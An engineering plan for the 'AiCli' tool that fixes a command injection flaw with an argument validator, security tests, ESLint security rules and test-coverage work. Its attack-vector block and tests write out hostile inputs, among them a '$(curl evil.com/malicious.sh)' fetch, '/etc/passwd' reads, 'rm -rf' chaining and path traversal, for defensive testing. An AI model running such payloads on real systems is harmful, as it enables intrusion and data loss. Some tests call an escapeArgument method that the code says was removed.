# Implementation Document: Critical Fixes & High Priority Improvements

**Project:** AiCli
**Document Version:** 1.0
**Date:** 2024-11-22
**Status:** Ready for Implementation
**Owner:** Engineering Team

---

## Executive Summary

This document outlines the implementation plan for **critical security fixes** and **high-priority improvements** identified in the comprehensive code review. These items are categorized as P0 (Critical) and P1 (High Priority) and should be addressed within the next 2-4 weeks.

### Scope Overview

- **Critical Items (P0):** 3 items - Security, Linting, Dependencies
- **High Priority Items (P1):** 4 items - Testing, Logging, Architecture, CI/CD
- **Estimated Total Effort:** 12-15 working days
- **Team Size:** 2-3 engineers
- **Target Completion:** 4 weeks from start

---

## Table of Contents

1. [P0-001: Fix Command Injection Vulnerability](#p0-001-fix-command-injection-vulnerability)
2. [P0-002: Fix ESLint Configuration](#p0-002-fix-eslint-configuration)
3. [P0-003: Install Dependencies & Verify Build](#p0-003-install-dependencies--verify-build)
4. [P1-001: Increase Test Coverage to 70%+](#p1-001-increase-test-coverage-to-70)
5. [P1-002: Implement Structured Logging](#p1-002-implement-structured-logging)
6. [P1-003: Decouple Services from UI](#p1-003-decouple-services-from-ui)
7. [P1-004: Add CI/CD Pipeline](#p1-004-add-cicd-pipeline)
8. [Testing Strategy](#testing-strategy)
9. [Rollback Procedures](#rollback-procedures)
10. [Success Metrics](#success-metrics)

---

## P0-001: Fix Command Injection Vulnerability

### Priority: P0 (Critical)
### Estimated Effort: 6-8 hours
### Risk Level: HIGH - Security vulnerability

### Problem Statement

The `executeCommand()` method in `context.service.ts` splits user input on whitespace and passes arguments to `execFile()` without proper sanitization. This creates a command injection vulnerability where malicious users could execute arbitrary commands.

**Vulnerable Code Location:** `aicli/src/services/context.service.ts:363-396`

### Attack Vectors

```bash
# Example exploits:
/exec git log --pretty=format:"%H" && cat /etc/passwd
/exec ls -la; rm -rf /tmp/important
/exec npm install $(curl evil.com/malicious.sh)
```

### Implementation Steps

#### Step 1: Create Command Argument Validator (2 hours)

**File:** `aicli/src/utils/command-validator.ts`

```typescript
import * as path from 'path';

/**
 * Command argument validation utilities
 */
export class CommandValidator {
  // Dangerous characters that could enable command injection
  private static readonly DANGEROUS_CHARS = /[;&|`$()<>#\n\r\0]/;

  // Maximum argument length to prevent buffer overflow
  private static readonly MAX_ARG_LENGTH = 2048;

  // Command-specific argument schemas
  private static readonly COMMAND_SCHEMAS: Record<string, ArgumentSchema> = {
    git: {
      allowedFlags: ['-a', '-m', '-p', '-v', '--all', '--version', '--help', '--status'],
      allowedSubcommands: ['status', 'log', 'diff', 'branch', 'add', 'commit', 'push', 'pull'],
      requiresSubcommand: true,
    },
    npm: {
      allowedFlags: ['-v', '--version', '-g', '--global', '--save', '--save-dev'],
      allowedSubcommands: ['install', 'test', 'run', 'version', 'list'],
      requiresSubcommand: true,
    },
    ls: {
      allowedFlags: ['-l', '-a', '-h', '-R', '-t'],
      allowedSubcommands: [],
      requiresSubcommand: false,
    },
    // Add more commands as needed
  };

  /**
   * Validate command arguments for security
   */
  static validateArguments(command: string, args: string[]): ValidationResult {
    const errors: string[] = [];

    // Check each argument
    for (const arg of args) {
      // Length check
      if (arg.length > this.MAX_ARG_LENGTH) {
        errors.push(`Argument exceeds maximum length: ${arg.substring(0, 50)}...`);
        continue;
      }

      // Check for dangerous characters (unless it's a quoted string)
      if (this.DANGEROUS_CHARS.test(arg) && !this.isQuotedString(arg)) {
        errors.push(`Argument contains dangerous characters: ${arg}`);
        continue;
      }

      // Path traversal check for arguments that look like paths
      if (this.looksLikePath(arg)) {
        const validationError = this.validatePath(arg);
        if (validationError) {
          errors.push(validationError);
        }
      }
    }

    // Command-specific validation
    const schema = this.COMMAND_SCHEMAS[command];
    if (schema) {
      const schemaErrors = this.validateAgainstSchema(args, schema);
      errors.push(...schemaErrors);
    }

    return {
      valid: errors.length === 0,
      errors,
      sanitizedArgs: errors.length === 0 ? args : [],
    };
  }

  /**
   * Check if string is properly quoted
   */
  private static isQuotedString(arg: string): boolean {
    return (
      (arg.startsWith('"') && arg.endsWith('"')) ||
      (arg.startsWith("'") && arg.endsWith("'"))
    );
  }

  /**
   * Check if argument looks like a file path
   */
  private static looksLikePath(arg: string): boolean {
    return (
      arg.includes('/') ||
      arg.includes('\\') ||
      arg.startsWith('.') ||
      arg.includes(path.sep)
    );
  }

  /**
   * Validate path argument
   */
  private static validatePath(pathArg: string): string | null {
    // Remove quotes if present
    const cleanPath = pathArg.replace(/^["']|["']$/g, '');

    // Check for path traversal
    if (cleanPath.includes('..')) {
      return `Path traversal detected: ${pathArg}`;
    }

    // Check for absolute paths outside project (if it starts with /)
    if (path.isAbsolute(cleanPath)) {
      const projectRoot = process.cwd();
      const resolved = path.resolve(cleanPath);
      if (!resolved.startsWith(projectRoot)) {
        return `Absolute path outside project: ${pathArg}`;
      }
    }

    return null;
  }

  /**
   * Validate arguments against command schema
   */
  private static validateAgainstSchema(
    args: string[],
    schema: ArgumentSchema
  ): string[] {
    const errors: string[] = [];

    if (schema.requiresSubcommand && args.length === 0) {
      errors.push('Command requires a subcommand');
      return errors;
    }

    if (schema.requiresSubcommand) {
      const subcommand = args[0];
      if (!schema.allowedSubcommands.includes(subcommand)) {
        errors.push(
          `Invalid subcommand: ${subcommand}. Allowed: ${schema.allowedSubcommands.join(', ')}`
        );
      }
    }

    // Validate flags
    const flags = args.filter(arg => arg.startsWith('-'));
    for (const flag of flags) {
      if (!schema.allowedFlags.includes(flag)) {
        errors.push(`Invalid flag: ${flag}. Allowed: ${schema.allowedFlags.join(', ')}`);
      }
    }

    return errors;
  }

  // Removed escapeArgument method: not needed for execFile with shell: false
}

interface ValidationResult {
  valid: boolean;
  errors: string[];
  sanitizedArgs: string[];
}

interface ArgumentSchema {
  allowedFlags: string[];
  allowedSubcommands: string[];
  requiresSubcommand: boolean;
}
```

#### Step 2: Update Context Service (2 hours)

**File:** `aicli/src/services/context.service.ts`

**Changes:**

```typescript
// At top of file
import { CommandValidator } from '../utils/command-validator';

// Update executeCommand method (line 94)
async executeCommand(command: string): Promise<CommandResult> {
  this.addCommand(command);
  this.logCommandExecution(command);

  const trimmed = command.trim();
  const tokens = this.tokenizeCommand(trimmed);

  if (tokens.length === 0) {
    return { output: "", error: "No command provided" };
  }

  const cmd = tokens[0].toLowerCase();
  const args = tokens.slice(1);

  // Feature: Safe Delete
  if (cmd === "rm" || cmd === "del") {
    return this.handleSafeDelete(tokens);
  }

  // Security: Whitelist
  if (!ContextService.ALLOWED_COMMANDS.includes(cmd)) {
    const errorMsg = `Command not allowed: ${cmd}`;
    this.addOutput(errorMsg);
    return { output: '', error: errorMsg };
  }

  // **NEW: Argument Validation**
  const validation = CommandValidator.validateArguments(cmd, args);
  if (!validation.valid) {
    const errorMsg = `Command blocked: ${validation.errors.join('; ')}`;
    this.addOutput(errorMsg);
    return { output: '', error: errorMsg };
  }

  // Use validated arguments
  return this.runShellCommand(cmd, validation.sanitizedArgs);
}

// Update runShellCommand signature and implementation
private async runShellCommand(cmd: string, args: string[]): Promise<CommandResult> {
  try {
    const { execFile } = await import('child_process');
    const { promisify } = await import('util');
    const execFileAsync = promisify(execFile);

    const { stdout, stderr } = await execFileAsync(cmd, args, {
      cwd: process.cwd(),
      maxBuffer: 10 * 1024 * 1024,
      timeout: 30000, // Increased to 30s
      shell: false, // CRITICAL: Never use shell mode
      env: {
        ...process.env,
        // Remove dangerous env vars
        LD_PRELOAD: undefined,
        LD_LIBRARY_PATH: undefined,
      }
    });

    const output = stdout + (stderr || "");
    this.addOutput(output);

    return {
      output,
      error: stderr || undefined,
    };
  } catch (error: any) {
    const errorMsg = error.message || "Command execution failed.";
    this.addOutput(errorMsg);
    return {
      output: error.stdout || "",
      error: errorMsg,
    };
  }
}
```

#### Step 3: Add Comprehensive Tests (2 hours)

**File:** `aicli/src/utils/__tests__/command-validator.test.ts`

```typescript
import { CommandValidator } from '../command-validator';

describe('CommandValidator', () => {
  describe('validateArguments', () => {
    it('should allow safe arguments', () => {
      const result = CommandValidator.validateArguments('git', ['status']);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should block command injection with semicolon', () => {
      const result = CommandValidator.validateArguments('git', ['status;', 'cat', '/etc/passwd']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('dangerous characters');
    });

    it('should block command injection with pipe', () => {
      const result = CommandValidator.validateArguments('ls', ['-la', '|', 'grep', 'secret']);
      expect(result.valid).toBe(false);
    });

    it('should block command injection with backticks', () => {
      const result = CommandValidator.validateArguments('echo', ['`whoami`']);
      expect(result.valid).toBe(false);
    });

    it('should block command injection with $() substitution', () => {
      const result = CommandValidator.validateArguments('npm', ['install', '$(curl evil.com)']);
      expect(result.valid).toBe(false);
    });

    it('should block path traversal', () => {
      const result = CommandValidator.validateArguments('cat', ['../../etc/passwd']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Path traversal');
    });

    it('should allow quoted strings with special chars', () => {
      const result = CommandValidator.validateArguments('git', ['commit', '-m', '"Fix: issue #123"']);
      expect(result.valid).toBe(true);
    });

    it('should reject oversized arguments', () => {
      const longArg = 'a'.repeat(3000);
      const result = CommandValidator.validateArguments('ls', [longArg]);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('exceeds maximum length');
    });

    it('should validate git subcommands', () => {
      const result = CommandValidator.validateArguments('git', ['hack']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Invalid subcommand');
    });

    it('should validate npm subcommands', () => {
      const result = CommandValidator.validateArguments('npm', ['malicious']);
      expect(result.valid).toBe(false);
    });
  });

  describe('escapeArgument', () => {
    it('should escape spaces', () => {
      expect(CommandValidator.escapeArgument('hello world')).toBe('hello\\ world');
    });

    it('should escape special characters', () => {
      expect(CommandValidator.escapeArgument('$HOME')).toBe('\\$HOME');
    });

    it('should not double-escape quoted strings', () => {
      expect(CommandValidator.escapeArgument('"hello world"')).toBe('"hello world"');
    });
  });
});
```

**File:** `aicli/src/services/__tests__/context.service.security.test.ts`

```typescript
import { contextService } from '../context.service';

describe('ContextService - Security Tests', () => {
  describe('Command Injection Protection', () => {
    it('should block command chaining with semicolon', async () => {
      const result = await contextService.executeCommand('ls; cat /etc/passwd');
      expect(result.error).toBeDefined();
      expect(result.error).toContain('blocked');
    });

    it('should block command substitution', async () => {
      const result = await contextService.executeCommand('echo $(whoami)');
      expect(result.error).toBeDefined();
    });

    it('should block pipe redirection', async () => {
      const result = await contextService.executeCommand('ls | grep secret');
      expect(result.error).toBeDefined();
    });

    it('should execute safe commands', async () => {
      const result = await contextService.executeCommand('echo hello');
      expect(result.error).toBeUndefined();
      expect(result.output).toContain('hello');
    });
  });

  describe('Path Traversal Protection', () => {
    it('should block reading files outside project', async () => {
      const result = await contextService.executeCommand('cat ../../etc/passwd');
      expect(result.error).toBeDefined();
      expect(result.error).toContain('Path traversal');
    });

    it('should allow reading files inside project', async () => {
      const result = await contextService.executeCommand('cat package.json');
      expect(result.error).toBeUndefined();
    });
  });
});
```

#### Step 4: Security Documentation (1 hour)

**File:** `aicli/SECURITY.md`

```markdown
# Security Policy

## Command Execution Security

AiCli implements multiple layers of security for command execution:

### 1. Command Whitelist
Only pre-approved commands can be executed. See `context.service.ts` for the full list.

### 2. Argument Validation
All command arguments are validated to prevent:
- Command injection (`;`, `|`, `&`, backticks, `$()`)
- Path traversal (`..`)
- Buffer overflow (max 2048 chars per argument)
- Unauthorized subcommands and flags

### 3. Sandboxing
- Commands execute without shell interpretation (`shell: false`)
- Environment variables are sanitized
- Dangerous env vars (`LD_PRELOAD`, etc.) are removed

### 4. Safe Delete
The `rm` and `del` commands move files to `.not-needed/` instead of deleting.

## Reporting Security Issues

Please report security vulnerabilities to: security@aicli.dev

Do NOT open public GitHub issues for security vulnerabilities.
```

#### Step 5: Code Review Checklist (30 minutes)

- [ ] All test cases pass (12+ new tests)
- [ ] Command injection tests cover all attack vectors
- [ ] Path traversal tests verify boundary conditions
- [ ] No regressions in existing functionality
- [ ] Security documentation updated
- [ ] Code reviewed by 2+ engineers
- [ ] Penetration testing performed

### Testing Requirements

1. **Unit Tests:** 12+ tests in command-validator.test.ts
2. **Integration Tests:** 6+ tests in context.service.security.test.ts
3. **Manual Penetration Testing:**
   - Attempt 20+ command injection payloads
   - Test against OWASP Command Injection cheat sheet
   - Verify all blocked appropriately

### Acceptance Criteria

- [ ] All known command injection vectors blocked
- [ ] 100% test coverage for CommandValidator
- [ ] No false positives on legitimate commands
- [ ] Security documentation complete
- [ ] Peer review approved by security expert

### Rollback Procedure

If issues are discovered:

1. Revert commit: `git revert <commit-hash>`
2. Restore original `context.service.ts`
3. Disable `/exec` command temporarily
4. Post hotfix release

---

## P0-002: Fix ESLint Configuration

### Priority: P0 (Critical)
### Estimated Effort: 2 hours
### Risk Level: MEDIUM

### Problem Statement

ESLint v9 changed the default configuration format from `.eslintrc.js` to `eslint.config.js`. The current setup has ESLint v9 installed but no compatible configuration file.

### Implementation Steps

#### Step 1: Create ESLint v9 Configuration (1 hour)

**File:** `aicli/eslint.config.js`

```javascript
import js from '@eslint/js';
import tsPlugin from '@typescript-eslint/eslint-plugin';
import tsParser from '@typescript-eslint/parser';
import securityPlugin from 'eslint-plugin-security';

export default [
  // Base JavaScript recommended rules
  js.configs.recommended,

  // Global ignores
  {
    ignores: [
      'dist/**',
      'node_modules/**',
      '**/*.test.ts',
      '**/__tests__/**',
      'coverage/**',
      '.not-needed/**',
    ],
  },

  // TypeScript files configuration
  {
    files: ['**/*.ts'],
    languageOptions: {
      parser: tsParser,
      parserOptions: {
        ecmaVersion: 2020,
        sourceType: 'module',
        project: './tsconfig.json',
      },
      globals: {
        console: 'readonly',
        process: 'readonly',
        __dirname: 'readonly',
        __filename: 'readonly',
        Buffer: 'readonly',
        setTimeout: 'readonly',
        setInterval: 'readonly',
        clearTimeout: 'readonly',
        clearInterval: 'readonly',
      },
    },
    plugins: {
      '@typescript-eslint': tsPlugin,
      'security': securityPlugin,
    },
    rules: {
      // TypeScript rules
      '@typescript-eslint/no-explicit-any': 'warn',
      '@typescript-eslint/explicit-function-return-type': 'off',
      '@typescript-eslint/no-unused-vars': ['error', {
        argsIgnorePattern: '^_',
        varsIgnorePattern: '^_'
      }],
      '@typescript-eslint/no-non-null-assertion': 'warn',
      '@typescript-eslint/prefer-nullish-coalescing': 'error',
      '@typescript-eslint/prefer-optional-chain': 'error',
      '@typescript-eslint/no-floating-promises': 'error',
      '@typescript-eslint/await-thenable': 'error',

      // Security rules
      'security/detect-object-injection': 'warn',
      'security/detect-non-literal-fs-filename': 'warn',
      'security/detect-unsafe-regex': 'error',
      'security/detect-buffer-noassert': 'error',
      'security/detect-child-process': 'warn',
      'security/detect-disable-mustache-escape': 'error',
      'security/detect-eval-with-expression': 'error',
      'security/detect-no-csrf-before-method-override': 'error',
      'security/detect-non-literal-regexp': 'warn',
      'security/detect-non-literal-require': 'warn',
      'security/detect-possible-timing-attacks': 'warn',
      'security/detect-pseudoRandomBytes': 'error',

      // General rules
      'no-console': ['warn', { allow: ['error', 'warn'] }],
      'no-debugger': 'error',
      'no-var': 'error',
      'prefer-const': 'error',
      'prefer-arrow-callback': 'error',
      'no-throw-literal': 'error',
      'eqeqeq': ['error', 'always'],
      'curly': ['error', 'all'],
      'no-eval': 'error',
      'no-implied-eval': 'error',
      'no-new-func': 'error',
      'no-return-await': 'error',
      'require-await': 'error',
    },
  },

  // Test files - relaxed rules
  {
    files: ['**/*.test.ts', '**/__tests__/**/*.ts'],
    rules: {
      '@typescript-eslint/no-explicit-any': 'off',
      'no-console': 'off',
    },
  },
];
```

#### Step 2: Update package.json Scripts (15 minutes)

```json
{
  "scripts": {
    "lint": "eslint .",
    "lint:fix": "eslint . --fix",
    "lint:report": "eslint . --output-file eslint-report.json --format json",
    "type-check": "tsc --noEmit"
  }
}
```

#### Step 3: Install Required Plugins (15 minutes)

```bash
npm install --save-dev @eslint/js @typescript-eslint/eslint-plugin @typescript-eslint/parser eslint-plugin-security
```

#### Step 4: Fix Existing Issues (30 minutes)

Run linter and fix issues:

```bash
npm run lint:fix
```

Manually fix remaining issues that can't be auto-fixed.

### Testing Requirements

1. Run `npm run lint` - should complete without errors
2. Verify security rules are active
3. Test on sample code with known violations

### Acceptance Criteria

- [ ] ESLint runs without configuration errors
- [ ] All security rules enabled
- [ ] No critical violations in codebase
- [ ] Warnings reduced to < 10
- [ ] Auto-fix works correctly

---

## P0-003: Install Dependencies & Verify Build

### Priority: P0 (Critical)
### Estimated Effort: 1 hour
### Risk Level: LOW

### Problem Statement

Dependencies are not installed (`node_modules` missing), preventing tests from running and builds from completing.

### Implementation Steps

#### Step 1: Clean Existing State (5 minutes)

```bash
cd /home/user/aicli/aicli
rm -rf node_modules package-lock.json dist
```

#### Step 2: Install Dependencies (10 minutes)

```bash
npm install
```

#### Step 3: Verify Build (10 minutes)

```bash
npm run build
```

Check for TypeScript errors:
```bash
npm run type-check
```

#### Step 4: Run Tests (10 minutes)

```bash
npm test
```

Verify all existing tests pass.

#### Step 5: Update .gitignore (5 minutes)

Ensure build artifacts are ignored:

```
node_modules/
dist/
coverage/
*.log
.env
.DS_Store
.not-needed/
eslint-report.json
```

#### Step 6: Document Dependencies (10 minutes)

**File:** `aicli/DEPENDENCIES.md`

```markdown
# Dependencies

## Installation

```bash
npm install
```

## Production Dependencies

- `@anthropic-ai/sdk`: Claude API client
- `openai`: OpenAI API client
- `better-sqlite3`: Embedded database
- `keytar`: System keychain integration
- `commander`: CLI framework
- `chalk`: Terminal colors
- `inquirer`: Interactive prompts

## Development Dependencies

- `typescript`: Type system
- `jest`: Testing framework
- `eslint`: Code linting
- `@typescript-eslint/*`: TypeScript ESLint support

## Updating Dependencies

```bash
npm outdated
npm update
npm audit fix
```
```

### Testing Requirements

- [ ] All dependencies install without errors
- [ ] Build completes successfully
- [ ] Tests run (even if some fail)
- [ ] No security vulnerabilities in `npm audit`

### Acceptance Criteria

- [ ] `npm install` completes successfully
- [ ] `npm run build` produces dist/ folder
- [ ] `npm test` executes test suite
- [ ] Zero high/critical vulnerabilities in audit

---

## P1-001: Increase Test Coverage to 70%+

### Priority: P1 (High)
### Estimated Effort: 3 days
### Risk Level: MEDIUM

### Problem Statement

Current test coverage is ~5-10% with only 3 test files. Critical services like ChatService, SecurityService, and SessionService have zero test coverage.

### Test Coverage Goals

| Service | Current | Target | Priority |
|---------|---------|--------|----------|
| ChatService | 0% | 80% | Critical |
| SecurityService | 0% | 90% | Critical |
| SessionService | 0% | 75% | Critical |
| ProviderFactory | 0% | 70% | High |
| ContextService | ~30% | 80% | High |
| ToolService | ~40% | 85% | Medium |
| RAGService | 0% | 70% | Medium |
| MCPService | 0% | 60% | Low |

### Implementation Steps

#### Step 1: Configure Coverage Reporting (1 hour)

**File:** `aicli/jest.config.js`

```javascript
module.exports = {
  preset: 'ts-jest',
  testEnvironment: 'node',
  roots: ['<rootDir>/src'],
  testMatch: ['**/__tests__/**/*.test.ts'],
  collectCoverage: true,
  coverageDirectory: 'coverage',
  coverageReporters: ['text', 'lcov', 'html', 'json-summary'],
  collectCoverageFrom: [
    'src/**/*.ts',
    '!src/**/*.d.ts',
    '!src/**/__tests__/**',
    '!src/types.ts',
    '!src/index.ts',
  ],
  coverageThresholds: {
    global: {
      branches: 70,
      functions: 70,
      lines: 70,
      statements: 70,
    },
    './src/services/chat.service.ts': {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80,
    },
    './src/services/security.service.ts': {
      branches: 90,
      functions: 90,
      lines: 90,
      statements: 90,
    },
  },
  setupFilesAfterEnv: ['<rootDir>/src/__tests__/setup.ts'],
  testTimeout: 10000,
};
```

#### Step 2: Create Test Setup File (30 minutes)

**File:** `aicli/src/__tests__/setup.ts`

```typescript
// Global test setup
import { jest } from '@jest/globals';

// Mock keytar globally for tests
jest.mock('keytar', () => ({
  setPassword: jest.fn().mockResolvedValue(undefined),
  getPassword: jest.fn().mockResolvedValue('mock-api-key'),
  deletePassword: jest.fn().mockResolvedValue(true),
}));

// Mock better-sqlite3 for tests
jest.mock('better-sqlite3', () => {
  return jest.fn().mockImplementation(() => ({
    prepare: jest.fn().mockReturnValue({
      run: jest.fn(),
      get: jest.fn(),
      all: jest.fn().mockReturnValue([]),
    }),
    close: jest.fn(),
    exec: jest.fn(),
  }));
});

// Increase timeout for integration tests
jest.setTimeout(10000);

// Global cleanup
afterEach(() => {
  jest.clearAllMocks();
});
```

#### Step 3: ChatService Tests (8 hours)

**File:** `aicli/src/services/__tests__/chat.service.test.ts`

```typescript
import { ChatService } from '../chat.service';
import { sessionService } from '../session.service';
import { contextService } from '../context.service';
import { configService } from '../config.service';
import { agentService } from '../agent.service';
import { toolService } from '../tool.service';
import { uiRenderer } from '../../ui/renderer';
import { providerFactory } from '../../providers';

// Mock all dependencies
jest.mock('../session.service');
jest.mock('../context.service');
jest.mock('../config.service');
jest.mock('../agent.service');
jest.mock('../tool.service');
jest.mock('../../ui/renderer');
jest.mock('../../providers');

describe('ChatService', () => {
  let chatService: ChatService;
  let mockProvider: any;

  beforeEach(() => {
    chatService = new ChatService();

    // Setup mock provider
    mockProvider = {
      name: 'mock-provider',
      chat: jest.fn().mockResolvedValue('Mock response'),
      streamChat: jest.fn(),
      isAvailable: jest.fn().mockResolvedValue(true),
      initialize: jest.fn().mockResolvedValue(undefined),
    };

    (providerFactory.getProvider as jest.Mock).mockResolvedValue(mockProvider);

    // Setup mock session
    (sessionService.getCurrentSession as jest.Mock).mockReturnValue({
      id: 'test-session',
      messages: [],
      name: 'Test',
      created: new Date(),
      updated: new Date(),
    });

    (sessionService.addMessage as jest.Mock).mockImplementation((role, content) => ({
      id: 'msg-id',
      role,
      content,
      timestamp: new Date(),
    }));

    (sessionService.getLastNMessages as jest.Mock).mockReturnValue([]);

    // Setup mock context
    (contextService.getContext as jest.Mock).mockResolvedValue({
      cwd: '/test',
      system: { os: 'Linux', platform: 'linux', shell: 'bash' },
      history: { commands: [], outputs: [] },
    });

    (contextService.buildSystemPrompt as jest.Mock).mockReturnValue('System prompt');

    // Setup mock config
    (configService.get as jest.Mock).mockImplementation((key) => {
      if (key === 'context') {
        return { maxHistory: 50, maxContextTokens: 16000 };
      }
      if (key === 'defaultProvider') {
        return 'ollama';
      }
      return {};
    });

    (configService.getProviderConfig as jest.Mock).mockReturnValue({
      model: 'test-model',
    });

    // Setup mock agent
    (agentService.getCurrentAgent as jest.Mock).mockReturnValue(null);

    // Setup mock tools
    (toolService.getSystemPromptAddition as jest.Mock).mockReturnValue('Tools info');
    (toolService.parseToolCall as jest.Mock).mockReturnValue(null);
  });

  describe('switchProvider', () => {
    it('should initialize provider successfully', async () => {
      await chatService.switchProvider('ollama');

      expect(providerFactory.getProvider).toHaveBeenCalled();
      expect(mockProvider.initialize).toHaveBeenCalled();
      expect(mockProvider.isAvailable).toHaveBeenCalled();
    });

    it('should throw error if provider is not available', async () => {
      mockProvider.isAvailable.mockResolvedValue(false);

      await expect(chatService.switchProvider('ollama')).rejects.toThrow(
        'Provider ollama is not available'
      );
    });

    it('should set default config if none exists', async () => {
      (configService.getProviderConfig as jest.Mock).mockReturnValue(null);

      await chatService.switchProvider('ollama');

      expect(configService.setProviderConfig).toHaveBeenCalledWith(
        'ollama',
        expect.objectContaining({ model: expect.any(String) })
      );
    });
  });

  describe('chat', () => {
    beforeEach(async () => {
      await chatService.switchProvider('ollama');
    });

    it('should send message and receive response', async () => {
      const response = await chatService.chat('Hello', { streaming: false });

      expect(sessionService.addMessage).toHaveBeenCalledWith('user', 'Hello');
      expect(mockProvider.chat).toHaveBeenCalled();
      expect(response).toBe('Mock response');
    });

    it('should throw error if no provider initialized', async () => {
      const newChatService = new ChatService();

      await expect(newChatService.chat('Hello')).rejects.toThrow(
        'No provider initialized'
      );
    });

    it('should throw error if no active session', async () => {
      (sessionService.getCurrentSession as jest.Mock).mockReturnValue(null);

      await expect(chatService.chat('Hello')).rejects.toThrow(
        'No active session'
      );
    });

    it('should handle streaming responses', async () => {
      const chunks = ['Hello', ' ', 'World'];
      mockProvider.streamChat = jest.fn().mockImplementation(async function* () {
        for (const chunk of chunks) {
          yield chunk;
        }
      });

      const response = await chatService.chat('Test', { streaming: true });

      expect(response).toBe('Hello World');
      expect(uiRenderer.startStreamingResponse).toHaveBeenCalled();
      expect(uiRenderer.endStreamingResponse).toHaveBeenCalled();
    });

    it('should handle tool execution', async () => {
      const toolCallResponse = 'Execute this: <tool_code>{"name":"list_files","arguments":{"path":"."}}</tool_code>';
      const toolOutput = 'file1.ts\nfile2.ts';

      mockProvider.chat
        .mockResolvedValueOnce(toolCallResponse)
        .mockResolvedValueOnce('Here are the files: file1.ts, file2.ts');

      (toolService.parseToolCall as jest.Mock)
        .mockReturnValueOnce({ name: 'list_files', args: { path: '.' } })
        .mockReturnValueOnce(null);

      const mockTool = {
        execute: jest.fn().mockResolvedValue(toolOutput),
      };

      (toolService.getTool as jest.Mock).mockReturnValue(mockTool);

      const response = await chatService.chat('List files');

      expect(toolService.parseToolCall).toHaveBeenCalled();
      expect(mockTool.execute).toHaveBeenCalledWith({ path: '.' });
      expect(mockProvider.chat).toHaveBeenCalledTimes(2);
    });

    it('should limit tool execution to maxSteps', async () => {
      // Mock infinite tool loop
      mockProvider.chat.mockResolvedValue(
        '<tool_code>{"name":"test","arguments":{}}</tool_code>'
      );
      (toolService.parseToolCall as jest.Mock).mockReturnValue({
        name: 'test',
        args: {}
      });
      (toolService.getTool as jest.Mock).mockReturnValue({
        execute: jest.fn().mockResolvedValue('output'),
      });

      await chatService.chat('Test');

      // Should only execute 5 times (maxSteps)
      expect(mockProvider.chat).toHaveBeenCalledTimes(5);
    });

    it('should handle tool not found', async () => {
      mockProvider.chat
        .mockResolvedValueOnce('<tool_code>{"name":"unknown","arguments":{}}</tool_code>')
        .mockResolvedValueOnce('Tool not found error handled');

      (toolService.parseToolCall as jest.Mock)
        .mockReturnValueOnce({ name: 'unknown', args: {} })
        .mockReturnValueOnce(null);

      (toolService.getTool as jest.Mock).mockReturnValue(undefined);

      const response = await chatService.chat('Test');

      expect(sessionService.addMessage).toHaveBeenCalledWith(
        'system',
        expect.stringContaining("Tool 'unknown' not found"),
        expect.any(Object)
      );
    });
  });

  describe('switchProviderWithFallback', () => {
    it('should try fallback providers on failure', async () => {
      mockProvider.isAvailable
        .mockResolvedValueOnce(false) // ollama fails
        .mockResolvedValueOnce(true);  // openai succeeds

      await chatService.switchProviderWithFallback('ollama');

      expect(uiRenderer.renderWarning).toHaveBeenCalled();
      expect(uiRenderer.renderInfo).toHaveBeenCalledWith(
        expect.stringContaining('Fallback')
      );
    });

    it('should throw if all providers fail', async () => {
      mockProvider.isAvailable.mockResolvedValue(false);

      await expect(chatService.switchProviderWithFallback('ollama')).rejects.toThrow(
        'All providers failed'
      );
    });
  });

  describe('checkProviderStatus', () => {
    it('should return status when provider is available', async () => {
      await chatService.switchProvider('ollama');

      const status = await chatService.checkProviderStatus();

      expect(status).toEqual({
        provider: 'mock-provider',
        available: true,
      });
    });

    it('should return error when provider is not available', async () => {
      await chatService.switchProvider('ollama');
      mockProvider.isAvailable.mockResolvedValue(false);

      const status = await chatService.checkProviderStatus();

      expect(status.available).toBe(false);
    });

    it('should handle no provider initialized', async () => {
      const newChatService = new ChatService();
      const status = await newChatService.checkProviderStatus();

      expect(status).toEqual({
        provider: 'none',
        available: false,
        error: 'No provider initialized',
      });
    });
  });

  describe('getEmbedding', () => {
    it('should call provider embed method', async () => {
      await chatService.switchProvider('ollama');
      mockProvider.embed = jest.fn().mockResolvedValue([0.1, 0.2, 0.3]);

      const embedding = await chatService.getEmbedding('test text');

      expect(mockProvider.embed).toHaveBeenCalledWith('test text');
      expect(embedding).toEqual([0.1, 0.2, 0.3]);
    });

    it('should throw error if provider does not support embeddings', async () => {
      await chatService.switchProvider('ollama');
      mockProvider.embed = undefined;

      await expect(chatService.getEmbedding('test')).rejects.toThrow(
        'does not support embeddings'
      );
    });
  });
});
```

#### Step 4: SecurityService Tests (4 hours)

**File:** `aicli/src/services/__tests__/security.service.test.ts`

```typescript
import { SecurityService } from '../security.service';
import * as keytar from 'keytar';
import * as crypto from 'crypto';

jest.mock('keytar');

describe('SecurityService', () => {
  let securityService: SecurityService;
  const mockKeytar = keytar as jest.Mocked<typeof keytar>;

  beforeEach(() => {
    securityService = new SecurityService();
    jest.clearAllMocks();
  });

  describe('Keychain Management', () => {
    describe('setSecret', () => {
      it('should store secret in keychain', async () => {
        await securityService.setSecret('test-account', 'secret-value');

        expect(mockKeytar.setPassword).toHaveBeenCalledWith(
          'aicli',
          'test-account',
          'secret-value'
        );
      });
    });

    describe('getSecret', () => {
      it('should retrieve secret from keychain', async () => {
        mockKeytar.getPassword.mockResolvedValue('stored-secret');

        const secret = await securityService.getSecret('test-account');

        expect(mockKeytar.getPassword).toHaveBeenCalledWith('aicli', 'test-account');
        expect(secret).toBe('stored-secret');
      });

      it('should return null if secret not found', async () => {
        mockKeytar.getPassword.mockResolvedValue(null);

        const secret = await securityService.getSecret('nonexistent');

        expect(secret).toBeNull();
      });
    });

    describe('deleteSecret', () => {
      it('should delete secret from keychain', async () => {
        mockKeytar.deletePassword.mockResolvedValue(true);

        const result = await securityService.deleteSecret('test-account');

        expect(mockKeytar.deletePassword).toHaveBeenCalledWith('aicli', 'test-account');
        expect(result).toBe(true);
      });
    });
  });

  describe('Encryption', () => {
    beforeEach(() => {
      // Mock encryption key retrieval
      mockKeytar.getPassword.mockImplementation(async (service, account) => {
        if (account === 'session_encryption_key') {
          return '0'.repeat(64); // 32 bytes as hex
        }
        return null;
      });
    });

    describe('encrypt', () => {
      it('should encrypt text with AES-256-GCM', async () => {
